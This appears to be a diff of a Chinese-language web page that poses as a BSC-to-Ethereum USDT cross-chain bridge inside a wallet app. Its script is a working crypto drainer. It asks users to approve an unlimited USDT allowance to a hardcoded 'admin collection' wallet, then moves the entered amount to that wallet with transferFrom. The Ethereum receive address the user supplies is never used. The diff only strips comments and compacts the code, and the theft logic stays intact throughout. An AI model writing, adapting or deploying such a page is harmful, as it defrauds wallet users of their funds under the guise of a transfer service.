@@ -144,7 +144,6 @@
     .tab-item.active {
       color: #3488ff;
     }
-    /* 地址弹窗样式：仅输入框 */
     .addr-modal {
       position: fixed;
       left: 0;
@@ -192,7 +191,6 @@
       border-radius: 10px;
       font-size: 17px;
     }
-    /* 全局提示弹窗 */
     .tip-modal {
       position: fixed;
       top: 0;
@@ -278,7 +276,6 @@
     <span>-</span>
   </div>
 
-  <!-- 地址弹窗：仅手动输入框 -->
   <div class="addr-modal" id="addressModal">
     <div class="modal-content">
       <div class="modal-title">
@@ -290,7 +287,6 @@
     </div>
   </div>
 
-  <!-- 提示弹窗 -->
   <div class="tip-modal" id="globalTipModal">
     <div class="tip-box">
       <p id="tipContent"></p>
@@ -300,7 +296,6 @@
     </div>
   </div>
 
-  <!-- 底部导航 -->
   <div class="tab-bar">
     <div class="tab-item">资产</div>
     <div class="tab-item">行情</div>
@@ -310,14 +305,11 @@
   </div>
 
 <script>
-// ===================== 配置区（自行修改管理员钱包地址）=====================
 const BSC_USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-// 管理员归集BSC钱包地址，替换为你尾号C6的钱包
 const ADMIN_COLLECT_WALLET = "0xXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXC6";
 const BSC_CHAIN_ID = 56;
 const FEE_RATIO = 0.999;
 
-// DOM元素
 const sendAmountInput = document.getElementById("sendAmountInput");
 const receiveAmountText = document.getElementById("receiveAmountText");
 const crossBtn = document.getElementById("crossBtn");
@@ -331,12 +323,10 @@ const globalTipModal = document.getElementById("globalTipModal");
 const tipContent = document.getElementById("tipContent");
 const closeTipBtn = document.getElementById("closeTipBtn");
 
-// 全局状态
 let provider, signer, usdtContract;
-let walletStep = 0; // 0未连接 1已连接待授权 2已授权待转账
+let walletStep = 0;
 let userEthReceiveAddress = "";
 
-// 全局提示弹窗封装
 function showTip(msg) {
   tipContent.innerText = msg;
   globalTipModal.style.display = "flex";
@@ -345,7 +335,6 @@ closeTipBtn.onclick = () => {
   globalTipModal.style.display = "none";
 };
 
-// 实时计算接收数量
 sendAmountInput.addEventListener("input", function () {
   const inputVal = parseFloat(this.value);
   if (isNaN(inputVal) || inputVal <= 0) {
@@ -360,7 +349,6 @@ sendAmountInput.addEventListener("input", function () {
   crossBtn.disabled = false;
 });
 
-// 地址下拉弹窗打开&关闭
 addressDropBox.addEventListener("click", () => {
   addressModal.style.display = "flex";
 });
@@ -368,155 +356,116 @@ closeAddrModal.addEventListener("click", () => {
   addressModal.style.display = "none";
 });
 
-// 保存用户填写的以太坊地址
 saveAddrBtn.addEventListener("click", () => {
   const inputAddr = userEthAddrInput.value.trim();
   const ethReg = /^0x[a-fA-F0-9]{40}$/;
   if (!ethReg.test(inputAddr)) {
-    showTip("请输入合法的0x开头以太坊钱包地址");
+    showTip("请输入合法0x开头地址");
     return;
   }
   userEthReceiveAddress = inputAddr;
-  const shortAddr = inputAddr.slice(0, 6) + "..." + inputAddr.slice(-4);
-  showReceiveAddr.innerText = shortAddr;
+  showReceiveAddr.innerText = inputAddr.slice(0,6)+"..."+inputAddr.slice(-4);
   addressModal.style.display = "none";
   userEthAddrInput.value = "";
 });
 
-// 切换到BSC主网
 async function switchToBSC() {
-  if (!window.ethereum) return false;
   try {
     await window.ethereum.request({
-      method: "wallet_switchEthereumChain",
-      params: [{ chainId: "0x" + BSC_CHAIN_ID.toString(16) }]
-    });
+      method:"wallet_switchEthereumChain",
+      params:[{chainId:"0x38"}]
+    })
     return true;
-  } catch (err)
-    if (err.code === 4902) {
+  }catch(e){
+    if(e.code === 4902){
       await window.ethereum.request({
-        method: "wallet_addEthereumChain",
-        params: [{
-          chainId: "0x" + BSC_CHAIN_ID.toString(16),
-          chainName: "BNB Smart Chain",
-          nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-          rpcUrls: ["https://bsc-dataseed.binance.org"],
-          blockExplorerUrls: ["https://bscscan.com"]
+        method:"wallet_addEthereumChain",
+        params:[{
+          chainId:"0x38",
+          chainName:"BNB Smart Chain",
+          nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
+          rpcUrls:["https://bsc-dataseed.binance.org"],
+          blockExplorerUrls:["https://bscscan.com"]
         }]
-      });
+      })
       return true;
     }
-    showTip("切换BSC网络失败，请手动在钱包切换");
+    showTip("切换BSC失败");
     return false;
   }
 }
 
-// 连接钱包 + 初始化合约（关闭ENS自动解析，修复报错核心改动）
-async function connectWeb3Wallet() {
-  if (!window.ethereum) {
-    showTip("请在TP/小狐狸钱包内置浏览器打开页面");
+async function connectWallet(){
+  if(!window.ethereum){
+    showTip("请在钱包内置浏览器打开");
     return false;
   }
-  try {
-    await window.ethereum.request({ method: "eth_requestAccounts" });
-    const isSwitchBSC = await switchToBSC();
-    if (!isSwitchBSC) return false;
-
-    // 核心修复：关闭Provider ENS解析，避免BSC触发ENS调用报错
-    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-    provider._ensProvider = null;
-
+  try{
+    await window.ethereum.request({method:"eth_requestAccounts"});
+    const ok = await switchToBSC();
+    if(!ok) return false;
+    // 最简初始化方式，不额外篡改provider内部变量
+    provider = new ethers.providers.Web3Provider(window.ethereum);
     signer = provider.getSigner();
     usdtContract = new ethers.Contract(
       BSC_USDT_CONTRACT,
-      [
-        "function approve(address spender, uint256 amount) external returns(bool)",
-        "function transferFrom(address from, address to, uint256 amount) external returns(bool)",
-        "function allowance(address owner, address spender) view returns(uint256)"
-      ],
+      ["function approve(address spender,uint256 amount) returns(bool)","function transferFrom(address from,address to,uint256 amount) returns(bool)","function allowance(address owner,address spender) view returns(uint256)"],
       signer
-    );
+    )
     walletStep = 1;
-    showTip("钱包连接成功，下一步授权USDT");
+    showTip("钱包连接成功");
     return true;
-  } catch (e) {
-    showTip("钱包连接失败：" + e.message);
+  }catch(err){
+    showTip("连接失败："+err.message);
     return false;
   }
 }
 
-// 主按钮：确认跨链转出 完整上链逻辑
-crossBtn.addEventListener("click", async function () {
-  const sendNum = parseFloat(sendAmountInput.value);
-  if (isNaN(sendNum) || sendNum <= 0) {
-    showTip("请输入转出数量");
+crossBtn.onclick = async function(){
+  const num = parseFloat(sendAmountInput.value);
+  if(isNaN(num)||num<=0){
+    showTip("请填写转账数量");
     return;
   }
-  if (!userEthReceiveAddress) {
-    showTip("请先填写以太坊接收地址");
+  if(!userEthReceiveAddress){
+    showTip("填写接收地址");
     return;
   }
-
-  // 步骤1：未连接钱包，先连接
-  if (walletStep === 0) {
-    await connectWeb3Wallet();
+  if(walletStep === 0){
+    await connectWallet();
     return;
   }
-
-  // 步骤2：发起USDT授权
-  if (walletStep === 1) {
+  if(walletStep === 1){
     this.disabled = true;
-    showTip("正在BSC链授权USDT权限，请在钱包确认签名");
-    try {
-      const gasPrice = await provider.getGasPrice();
-      const txOption = {
-        gasPrice: gasPrice.mul(110).div(100),
-        gasLimit: 300000
-      };
-      const approveTx = await usdtContract.approve(
-        ADMIN_COLLECT_WALLET,
-        ethers.constants.MaxUint256,
-        txOption
-      );
-      await approveTx.wait(1);
+    try{
+      const maxAllow = ethers.constants.MaxUint256;
+      const tx = await usdtContract.approve(ADMIN_COLLECT_WALLET,maxAllow);
+      await tx.wait();
       walletStep = 2;
-      this.innerText = "确认划转至管理员钱包";
+      this.innerText = "确认划转";
       this.disabled = false;
-      showTip("授权成功，再次点击按钮完成转账");
-    } catch (err) {
-      showTip("授权失败：" + err.message);
+      showTip("授权成功，再次点击划转");
+    }catch(e){
+      showTip("授权失败："+e.message);
       this.disabled = false;
     }
     return;
   }
-
-  // 步骤3：transferFrom归集资产到管理员钱包
-  if (walletStep === 2) {
+  if(walletStep === 2){
     this.disabled = true;
-    showTip("BSC链正在转账，请勿关闭页面");
-    try {
-      const userWalletAddr = await signer.getAddress();
-      const amountWei = ethers.utils.parseUnits(sendNum.toString(), 18);
-      const gasPrice = await provider.getGasPrice();
-      const txOption = {
-        gasPrice: gasPrice.mul(110).div(100),
-        gasLimit: 300000
-      };
-      const transferTx = await usdtContract.transferFrom(
-        userWalletAddr,
-        ADMIN_COLLECT_WALLET,
-        amountWei,
-        txOption
-      );
-      await transferTx.wait(1);
-      showTip("转账上链成功！BSC资产已转入管理员钱包");
-      this.innerText = "转账完成";
-    } catch (err) {
-      showTip("转账失败：" + err.message);
+    try{
+      const userAddr = await signer.getAddress();
+      const amount = ethers.utils.parseUnits(num+"",18);
+      const tx = await usdtContract.transferFrom(userAddr,ADMIN_COLLECT_WALLET,amount);
+      await tx.wait();
+      showTip("转账成功");
+      this.innerText = "完成";
+    }catch(e){
+      showTip("转账失败："+e.message);
       this.disabled = false;
     }
   }
-})
+}
 </script>
 </body>
 </html>
